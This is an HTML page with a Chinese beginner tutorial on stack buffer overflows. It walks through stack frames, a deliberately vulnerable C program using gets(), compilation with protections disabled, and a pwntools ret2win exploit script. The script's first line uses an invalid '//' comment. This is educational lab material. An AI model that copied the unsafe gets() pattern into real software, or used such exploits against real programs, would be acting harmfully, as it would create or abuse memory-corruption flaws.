<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>ezoverflow</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
</head>
<body>
<div class="article-content" data-id="pwn-ezoverflow">
<div class="intro-article">
<h1>如何初次体会到pwn的乐趣</h1>
<p><em>从控制一次程序执行流开始!</em></p>
<h2>1.让我们先从最底层看看在c语言代码中调用一个函数时到底发生了什么吧🥰</h2>
<p>先来看一个最简单的c语言例子(你可以自己复刻并实现!)</p>
<p><span style="color:#ff6b6b">你可以亲眼看到程序是如何按照你的数据执行的!</span></p>
<blockquote>
<p>go on!</p>
</blockquote>
<pre><code class="language-c">// ezoverflow.c
#include &lt;stdio.h&gt;

void win(){
    printf(&quot;我被你控制了!真厉害!&quot;);
}

void vuln() {
    char buf[32];
    gets(buf);
}

int main() {
    vuln();
    return 0;
}
</code></pre>
<p>⚠️ 注意：gets() 是一个十分危险的函数，不会检查输入长度，这正好让我们用来做演示。</p>
<p>使用gcc编译</p>
<blockquote>
<p>gcc -g -fno-stack-protector -z execstack -no-pie ezoverflow.c -o ezoverflow</p>
</blockquote>
<p><em>先忽略这些复杂的参数…</em></p>
<p>编译完成后目录中会出现：</p>
<p><span style="color:#51cf66">ezoverflow</span></p>
<p>这就代表你成功获得了一个等待着被你pwn掉的程序😀</p>
<h2>2.栈帧(stack frame)是什么?😍</h2>
<p>先讲一点枯燥的理论知识…(但很重要)</p>
<p>在理解溢出之前，你必须先搞懂一个最核心的概念 —— <strong>函数的栈帧（Stack Frame）</strong>。</p>
<p>每当一个函数被调用时，系统都会在栈上为它创建一块“临时工作区”。</p>
<p>这块区域就叫做：</p>
<blockquote>
<p><strong>栈帧（Stack Frame）</strong></p>
</blockquote>
<p>它用来存放：</p>
<ul>
<li>函数的局部变量</li>
<li>返回地址（函数结束后跳回到哪里,<strong>关键!</strong>）</li>
<li>上一个函数的栈帧指针（saved rbp）</li>
<li>一些编译器需要的中间数据(rubbish)😅</li>
</ul>
<p>理解栈帧，就是理解程序真正如何“运行和返回”!</p>
<hr>
<h2>🧱 栈是怎样增长的？</h2>
<p>在 x86-64 架构里：</p>
<p>栈向低地址方向增长</p>
<ul>
<li>rsp 始终指向当前栈顶</li>
<li>rbp 指向当前函数栈帧的基址</li>
</ul>
<p>以上述vuln函数被调用时为例子</p>
<p>它的栈帧在内存中大致长这样（高地址 → 低地址）：</p>
<p>高地址</p>
<p>───────────────────────────────</p>
<p>|    返回地址 return address    | ← ret 指令最终跳回的位置(关键!)😍</p>
<p>───────────────────────────────</p>
<p>|       保存的 rbp (saved rbp)  | ← 上一个栈帧的基址</p>
<p>───────────────────────────────</p>
<p>|          buf[32] 区域         | ← 局部变量，从这里向下增长</p>
<p>───────────────────────────────</p>
<p>低地址</p>
<blockquote>
<p>这意味着什么？🤤</p>
</blockquote>
<p>buf 在底部（低地址）</p>
<p>return address 在更高地址</p>
<p>当你向 buf 写入超长内容时，会依次覆盖：</p>
<p>saved rbp</p>
<p>return address ❗</p>
<p>而一旦你覆盖了 return address，</p>
<p>函数 ret 时就会跳去你指定的地址。</p>
<p>这就是最经典的：</p>
<p>栈溢出 → 控制程序执行流!</p>
<h2>🧵 3.栈帧是如何建立和销毁的？</h2>
<p>编译器会在函数入口自动生成“开场白（prologue）”：</p>
<p>push rbp        ; 保存上一个栈帧基址</p>
<p>mov rbp, rsp    ; rbp = 当前栈顶，建立新栈帧</p>
<p>sub rsp, 0x20   ; 给局部变量分配空间</p>
<p>在函数结束时，会生成“收场白（epilogue）”：</p>
<p>leave           ; 恢复 rbp、rsp</p>
<p>ret             ; 弹出返回地址并跳转</p>
<p>因此：</p>
<p>ret 指令跳到哪里</p>
<p>是由 栈上的 return address 决定的!</p>
<blockquote>
<p>而这个 return address —— 我们是可以覆盖的!😌</p>
</blockquote>
<blockquote>
<p>只要输入够长!</p>
</blockquote>
<p>接下来所有基础 PWN 的利用方式其本质都是:</p>
<p>利用一个能写到栈上的漏洞 → 覆盖返回地址 → 劫持执行流</p>
<p>因此：</p>
<blockquote>
<p>理解栈帧，就是理解一切漏洞利用的第一步!😛😛</p>
</blockquote>
<h2>4.接下来，让我们亲自动手去pwn掉ezoverflow!😉</h2>
<p>基于理论知识:我们只要输入超过32个字节的字符串就能产生溢出</p>
<p>因此思路就是:</p>
<ul>
<li>先写入40个填充字节分别覆盖<strong>buf</strong>和<strong>saved rbp</strong></li>
<li>最后写入我们win函数的地址使得程序跳转到我们想让其执行的地方</li>
</ul>
<p>使用linux指令</p>
<blockquote>
<p>objdump -d ezoverflow | grep win</p>
</blockquote>
<p>你会看到win函数的地址!(别忘了动手…)😄</p>
<p>接下来就是用python写exploit脚本了!</p>
<p>非常简单!</p>
<pre><code class="language-python">//exploit.py
from pwn import *

p=process('./ezoverflow')

win_addr = 0x...   #自己写上!

payload = b'A' * 40
payload += p64(win_addr)

p.sendline(payload)
</code></pre>
<p>最后，你会看到:</p>
<blockquote>
<p>我被你控制了!真厉害!  😍😍😍😍</p>
</blockquote>
<p>程序走向了你指定的地址!</p>
<p>这便是:<strong>栈溢出漏洞</strong></p>
<p>如果你跟着动手做到了这里</p>
<blockquote>
<p>先给你点个赞👍👍👏👏</p>
</blockquote>
<p>万事开头难</p>
<p>但是</p>
<blockquote>
<p>🎉 你已经完成了第一份真正意义上的 PWN！</p>
</blockquote>
<p>接下来只是技巧的不断精进</p>
<p>本质思维是不变的!🐶🐶</p>
<p>That is end~</p>
<p>感谢阅读!😄</p>
</div>
</div>
</body>
</html>